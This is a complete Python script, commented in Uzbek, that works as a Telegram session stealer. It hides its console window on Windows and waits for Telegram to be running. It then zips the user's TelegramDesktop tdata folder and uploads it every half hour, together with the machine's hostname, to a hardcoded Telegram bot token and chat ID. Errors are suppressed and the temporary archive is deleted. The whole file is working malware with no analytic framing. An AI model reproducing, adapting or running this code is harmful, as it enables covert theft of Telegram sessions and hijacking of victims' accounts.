import os, ctypes, time, json, urllib.request, socket, tempfile, zipfile, subprocess

# Qora oynani yashirish
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_file(file_path, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as data:
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="caption"\r\n\r\n{text}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode() + data.read() + f"\r\n--{boundary}--\r\n".encode()
            req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
            urllib.request.urlopen(req)
    except:
        pass

def send_msg(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
    except:
        pass

def get_tdata():
    pc = socket.gethostname()
    path = os.path.join(os.getenv('APPDATA'), 'TelegramDesktop', 'tdata')
    if os.path.exists(path):
        try:
            zip_path = os.path.join(tempfile.gettempdir(), f"tdata_{pc}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for r, d, f in os.walk(path):
                    for file in f:
                        try: zipf.write(os.path.join(r, file), os.path.relpath(os.path.join(r, file), path))
                        except: pass
            return zip_path
        except:
            return None
    return None

last = 0
while True:
    time.sleep(60)
    try:
        r = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
        if "Telegram.exe" in r.stdout:
            if time.time() - last > 1800:
                z = get_tdata()
                if z:
                    send_file(z, f"✅ Yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
                    os.remove(z)
                    last = time.time()
    except:
        pass
